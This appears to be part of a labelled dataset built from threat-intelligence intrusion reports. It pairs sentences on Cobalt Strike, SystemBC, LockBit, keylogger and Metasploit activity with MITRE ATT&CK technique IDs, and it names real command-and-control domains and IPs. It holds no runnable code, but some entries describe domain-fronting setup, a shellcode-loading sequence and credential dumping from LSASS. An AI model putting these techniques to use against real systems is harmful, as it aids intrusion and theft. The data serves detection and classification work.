      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On a file server the threat actor reviewed Windows Task Manager several times.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "On the first day, they checked Windows Defender settings on a file server.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor was observed using RDP during the intrusion.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "On the final day, RDP sessions were initiated from the beachhead host to both a file server and a backup server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Authentication data from normal 4624 events was absent from the data collected, but using Microsoft-Windows-TerminalServices-LocalSessionManager eventID 21 logs, we were able to identify the logon activity.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors repeatedly leveraged remote services to facilitate lateral movement within the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "This kind of remote service creation can also be identified over the network with IDS detections such as ET RPC DCERPC SVCCTL – Remote Service Control Manager Access.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The initial command and control was a Cobalt Strike beacon to compdatasystems.com triggered by the execution of setup_wm.exe.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As part of the command and control (C2) phase, the threat actor established a connection to a second Cobalt Strike C2 server using the IP address 159.100.14.254 over port 443.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The domain associated with this server was retailadvertisingservices[.]com.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During this activity, process injection was observed, with the threat actor targeting legitimate processes such as svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injection activity allowed them to run malicious code within trusted system processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Communication with these command and control servers continued over the length of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Using dynamic analysis, we were able to determine several of the dropped files as SystemBC.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Communication to the SystemBC command and control server started on the first day and lasted over the length of the intrusion.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Analysis revealed that the other deployed proxy was GhostSOCKS, a Malware-as-a-Service (MaaS) tool.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These binaries were deployed on the beachhead host as well as a file share server and a backup server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution these binaries reached out to the following command and control servers:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "From a file share server the threat actor opened internet explorer and pulled up two sites, qaz[.]im and temp[.]sh.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Both of these sites are known as anonymous temporary file sharing services.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "They are often used to deploy tools or payloads by threat actors, but in this case we did not observe any downloads.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Next, a script named WMI.bat utilized WMI to copy the ransomware payload from the shared directory (SHARE$) to local machines and execute it.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "WMI commands further facilitated payload distribution, leveraging bitsadmin to transfer and execute the ransomware on remote hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "These commands triggered parent-child process chains, such as wmiprvse.exe spawning from bitsadmin commands:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Evidence of PSExec executions were identifiable by Service Creation events (Event ID 7045) and execution of PSEXESVC.exe.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor also utilized a modified version of WMI1.bat to distribute and execute the payload via WMI commands, targeting hosts listed in an input file.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "This phase exhibited similar process behavior as earlier, with wmiprvse.exe spawning the transfer tasks:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Similar to the previous WMI execution, on the remote host, wmiprvse.exe will be responsible for spawning the Bitsadmin transfer job.",
    "command": "",
    "labels": [
      "T1047",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Domain fronting is another method for concealing communication between the endpoint and the command and control servers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The main purpose of domain fronting is to connect to a restricted host while pretending to communicate with an allowed host.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "It essentially masks your traffic to a certain website by masquerading it as a different domain.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This technique is possible thanks to Content Delivery Networks (CDNs).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In recent years, attackers have started using this technique to hide their malicious infrastructure behind legitimate domains.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike made domain fronting possible by allowing the operators to configure related settings via the malleable C2 profiles.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Setup the CDN service to create a new CDN endpoint and redirect traffic to your domain. (e.g., l33th4x0r.cloudfront.net).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As demonstrated in the screenshot above, all they have to do is include their CDN endpoint domain (created in step three) in the host header of the request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In that way, the legitimate website will forward the traffic through the CDN to the original destination according to the host header.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In the screenshots below, you can see how the malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs:",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In most, of the above cases, the aim of the attackers was to establish a Remote Desktop session.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "There are numerous advantages to establishing a RDP session, including the ability to navigate using a graphical environment and easily move laterally once the necessary access has been granted.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "In this second image, we employ proxychains from the attacker’s Kali Linux host to RDP into our target’s environment via the SOCKS server.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Looking into the generated artifacts, we can see that a 4624 type 3 event is created on the target host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "One interesting aspect that we have also mentioned in similar cases from our reporting is that the victim’s hostname is captured in this logon event as well as the source address being 127.0.0.1.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Once again, the running Cobalt Strike beacon acts as the intermediary to facilitate the Remote Desktop session via reverse proxy.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The malleable profile determines the content of all parameters used in GET and POST requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "One could search for traffic that matches known patterns (such as jquery or amazon) but the target IP/domain does not match the expected infrastructure.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "SMB beacons are mostly used to make network detection harder and to get access to isolated systems where communication to the internet is prohibited.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Operators can also chain beacons and move laterally inside the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The network traffic shows the target host communicating over SMB with the other compromised host running the parent HTTP Beacon.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP over Reverse SSH Tunnel WFP by Samir Bousseaden is a rule that can look for suspicious RDP activity using reverse tunneling.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "CobaltStrike Malleable Amazon Browsing Traffic Profile by Markus Neis which looks at proxy logs for the Amazon Malleable profile.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Other malleable profile rules include CobaltStrike Malformed UAs in Malleable Profiles, CobaltStrike Malleable (OCSP) Profile, and CobaltStrike Malleable OneDrive Browsing Traffic Profile.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "One of the great features of Rita is its ease of use and detailed output information in various forms, including CSV and HTML.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The screenshot samples below show the results created by Rita based on the traffic we used in the previous sections to demonstrate the jquery malleable C2 profile.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first three IP addresses relate to the CS servers with which the Beacon communicated.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "As a result, we can detect Cobalt Strike beaconing regardless of the malleable C2 profile utilized or any additional jitter present.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Some of the most common droppers we see are IcedID (a.k.a. BokBot), ZLoader, Qbot (a.k.a. QakBot), Ursnif, Hancitor, Bazar and TrickBot.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors have the ability to change anything from the network communication (like user agent, headers, default URIs) to individual post-exploitation functions such as process injection and payload obfuscation capabilities.",
    "command": "",
    "labels": [
      "T1055",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "All the above intrusions made use of the same profile that mimics a legitimate jquery request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "In the case of the Solarwinds attack, the threat actors used several customized Cobalt Strike beacons to execute the second-stage payload on their victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "A lot of the Cobalt Strike post-exploitation tools are implemented as windows DLLs.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This means that every time a threat actor runs these built-in tools, Cobalt Strike spawns a temporary process and uses rundll32.exe to inject the malicious code into it and communicates the results back to the beacon using named pipes.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Defenders should pay close attention to command line events that rundll32 is executing without any arguments.",
    "command": "",
    "labels": [
      "T1055",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, we commonly see three methods regularly used by threat actors to download and execute the Cobalt Strike beacon.",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Using PowerShell to load and inject shellcode directly into memory",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Decoding the PowerShell command, we are presented with the shellcode that will be pushed into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Download to disk and execute manually on the target",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In the example below, you can see the TrickBot process downloading to disk, and then loading the beacon into memory.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The malicious Hancitor injected process(svchost.exe) downloaded the Cobalt Strike DLL beacon to disk and then proceeded with allocating a new memory region inside the current rundll32.exe process and loaded it into the memory.",
    "command": "",
    "labels": [
      "T1055",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Executing the beacon in memory via the initial malware infection",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In every intrusion, we see process injection taking place across the environment.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "It is mainly used to inject malicious code into a remote process and inject it into lsass.exe to extract credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "By injecting the malicious payload into a remote process, the threat actors are spawning a new session in the user context that the injected process belongs to.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Detect the Cobalt Strike default process injection with Sysmon by looking for the below EIDs in consecutive order:",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In other methods of process injection, such as process hollowing, EID 8 will not be present.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Unfortunately, it is very difficult to detect this process injection activity via security windows logs without Sysmon to monitor for the event IDs above.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In every Cobalt Strike occasion that we report, we see threat actors executing reconnaissance commands with the help of the “shell” command.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The commands are based on native windows utilities such as nltest.exe, whoami.exe, and net.exe to help with discovery.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Below are some recent examples from the Conti infection; however, these commands remain consistent with other intrusions we track.Conti operators executing reconnaissance commands through Cobalt Strike:",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "It is also worth mentioning that PowerShell is also used for enumerating the network looking for interesting targets.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "When it comes to PowerShell, unmodified PowerSploit and PowerView modules are a very common method threat actors are using to collect information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The most common technique that threat actors use to obtain SYSTEM level privileges is the GetSystem method via named-pipe impersonation.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The first one is the svc-exe.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "It attempts to drop an executable under “c:\\windows” and creates a service to run the payload as SYSTEM.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "However, as mentioned above, the most used method is the name pipe impersonation escalation via “getsystem” command.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As you can see below, Sysmon generates a lot more logs related to the successful privilege escalation using the “elevate svc-exe” option.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "In this case, spoolsv.exe is the executable that was dropped by Cobalt Strike to run a payload.",
    "command": "",
    "labels": [
      "T1055",
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "After getting access to the target using Cobalt Strike, one of the first tasks that operators take is to collect credentials and hashes from LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The first one uses the “hashdump” command to dump password hashes; the second one uses the command “logonpasswords” to dump plaintext credentials and NTLM hashes with Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Here’s an example of accessing LSASS to steal credentials from memory using “hashdump” command in Cobalt Strike:",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike is using GET and POST requests to communicate with the C2 server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "When it comes to C2, we typically see HTTP and HTTPS beacons.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "By default, Cobalt Strike will use GET requests to retrieve information and POST requests to send information back to the server.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Even though we don’t see this very often, the beacon could also be configured to send back information with GET requests in small chunks.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "“Results of executed commands are sent to the server using POST requests.”",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Once Cobalt Strike beacons are established, usually minutes later, we see operators moving laterally on servers of interest inside the network.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Even though they are generally fast at picking their targets, we infer that their decisions are based on the results from the discovery phase.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Strike can facilitate all the above techniques and even RDP using SOCKS proxy.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "We see them uploading their executable to their desired host with the “upload” Cobalt Strike command and execute it using the “remote-exec” command as documented in the capabilities section above but it can use psexec, winrm or wmi to execute a command and/or a beacon.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Cobalt Strike beacon can also use this token to interact with network resources and run remote commands.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "We also see that the beacon interacts with LSASS (Sysmon EID 10).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In this intrusion from August 2022, we observed a compromise that was initiated with a Word document containing a malicious VBA macro, which established persistence and communication to a command and control server (C2).",
    "command": "",
    "labels": [
      "T1071.001",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon performing initial discovery and user enumeration, the threat actor used AutoHotkey to launch a keylogger.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "As observed in this intrusion, the adversary executed the AHK keylogger script by calling a renamed version of AutoHotkey.exe (module.exe) and passing the script’s filename (module.ahk) as a command-line parameter.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The intrusion began with the execution of a malicious macro within a Word document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Upon opening the file, the user was prompted to enable macros to complete the form, which began execution of the malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Once executed, the macro created a VBS script (Updater.vbs), two PowerShell scripts (temp.ps1 and Script.ps1), and installed persistence through a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Following the execution of the VBA embedded macros, the PowerShell script, Script.ps1, began to connect to the C2 server through an encrypted channel.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Around a day after execution, the server became live and began sending instructions to the implant.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The instructions obtained from the server were then executed through the temp.ps1 PowerShell script.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors began executing basic discovery commands, all of which were executed via PowerShell cmdlets or built-in Windows utilities like whoami, net, time, tzutil and tracert; one exception to this was when the threat actors extracted a specific function from the PowerSploit framework, Convert-LDAPProperty, to enumerate domain accounts in the environment.",
    "command": "",
    "labels": [
      "T1016",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "All data collected was then exfiltrated over the existing C2 channel.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task was then created to assist in execution of the keylogger.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Additionally, a PowerShell script called readKey.ps1 would execute in the same task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "On the sixth day of the intrusion, the threat actors returned and collected the data compiled by the keylogger.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "After this data was exfiltrated, the threat actors reviewed the antivirus service status and some additional host data.",
    "command": "",
    "labels": [
      "T1082",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors returned again on the seventh and ninth days to collect the keylogger data.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "It’s also interesting to note that the PowerShell implant was and stayed fully undetectable for a significant period of time.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This is contrary to many of our reported cases where the initial access relies on initial access brokers and common malware used by those groups such as Emotet, IcedID, or Qbot.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The use of custom tailored malware points to a more targeted or discerning organization compared to the spray-and-pray approach performed by many access brokers.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Reviewing the network traffic, we observed two signatures fire on the C2 traffic – ET MALWARE TA452 Related Backdoor Activity (GET)/(POST).",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "This intrusion began with the execution of a malicious VBA macro embedded in a word document.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "First off, the macro gets the name of the user executing the Word document and creates a directory in AppData, if it doesn’t exist:",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "With Sysmon and FileCreate event 11, we can see that WINWORD.EXE successfully created these files:",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Then, in order to execute the script and install persistence, a new scheduled task was registered:",
    "command": "",
    "labels": [
      "T1053.005",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The XML above describing the scheduled task was directly embedded in the VBA macro.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The first scheduled task installed using the malicious VBA macro, executed a VBS script, which in turn executed a PowerShell script named Script.ps1.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Script.ps1 contacts the C2 server and executed the base64 commands using temp.ps1.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Event 201 from Microsoft-Windows-TaskScheduler/Operational highlights the successful execution of this scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The scheduled task was designed to execute module.exe and a PowerShell script named readKey.ps1.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor removed various files created by the discovery actions during the intrusion.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "During the intrusion, the threat actors executed the following for discovery tasks.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A scheduled task named MicrosoftEdgeUpdateTaskMachineUC was created by the threat actors.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The file t.xml contained the task used to execute these files.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Activity to the C2 is established via execution of the Script.ps1 and temp.ps1 files.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "First communication to the C2 (hxxp[:]//45[.]89[.]125[.]189/get) began on day one and beaconed in roughly 10-minute increments.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor leveraged RDP for lateral movement, deploying LockBit ransomware through multiple methods, including copying files over SMB shares for remote execution and automated distribution via PDQ Deploy.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first indication of threat actor activity was the execution of system discovery commands, including net user and whoami.",
    "command": "",
    "labels": [
      "T1012",
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Shortly after, the threat actor attempted to download AnyDesk via curl, but the attempt initially failed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "They then pivoted to using mshta to retrieve a remote HTA file containing a Metasploit stager.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After establishing command and control with the Metasploit server, they leveraged it to successfully download and install AnyDesk.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once installed, AnyDesk was configured with a preset password, providing the threat actor with persistent remote access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Within ten minutes, the threat actor began process enumeration using tasklist, identifying several processes of interest, which they then terminated.",
    "command": "",
    "labels": [
      "T1057",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "We assess that these processes belonged to a prior threat actor, and by killing them, the attacker ensured exclusive control over the server.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Notably, they terminated PowerShell, inadvertently killing their own Metasploit process.",
    "command": "",
    "labels": [
      "T1057",
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "This forced them to rerun the exploit to drop a new Metasploit stager and reestablish command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After regaining access, they created a new local account and added it to the Administrators group.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They accessed the beachhead host via rdp, using a newly created local account and then executed Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Using this information, they targeted a backup server, moving laterally via RDP using the default Administrator account.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "They then pivoted to a file share server via RDP.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors then pivoted to a domain controller via RDP using domain administrator credentials.",
    "command": "",
    "labels": [
      "T1021.001",
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Meanwhile, they returned to the backup server to review its configuration.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "They began by manually executing the ransomware on a backup server and a file share server over their active RDP sessions.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "The exploitation started from the IP address 92[.]51.2.22 as shown by the following Suricata alert.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The first commands executed by the threat actor were net user and whoami.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "These were used to enumerate the user accounts on the compromised Windows server and to gather information about the currently affected user.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Moreover, the exploitation was likely made through a Python script based on the user-agent used.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors can exploit this vulnerability by sending crafted HTTP POST requests to specific endpoints, such as /template/aui/text-inline.vm, with malicious payloads in the parameters.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "After running initial discovery commands the threat actor attempted to download an AnyDesk installer from their server using the exploit.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The execution of curl failed to download the AnyDesk installer though.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This did not stop the threat actor who later successfully downloaded an AnyDesk installer by other means.",
    "command": "",
    "labels": [
      "T1071.001",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Approximately ten minutes after gaining initial access, the threat actor leveraged the native Windows mshta.exe utility to download and execute a Metasploit stager.",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Gets the pointers to specific Windows API functions: VirtualAlloc(), VirtualProtect(), CreateThread() and WaitForSingleObject().",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Allocates a new region of memory via VirtualAlloc() with PAGE_EXECUTE_READWRITE (0x40) permissions.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Copies a base64 decoded Metasploit shellcode into the newly allocated region of memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Changes the protection of the new memory region into PAGE_EXECUTE (0x10).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Creates a new thread pointing to the start of the new memory region to execute the Metasploit shellcode.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Waits for the end of the shellcode execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "As part of the AnyDesk installation on the beachhead, a service was installed to ensure the instance became available again after a restart.",
    "command": "",
    "labels": [
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The Windows System event 7045 shows service creations.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "The details show that AnyDeskMSI.exe will be started, and the start type is set to auto, so it will run after a restart of the server.",
    "command": "",
    "labels": [
      "T1543.003",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor used both valid accounts and created a new account on the beachhead host.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
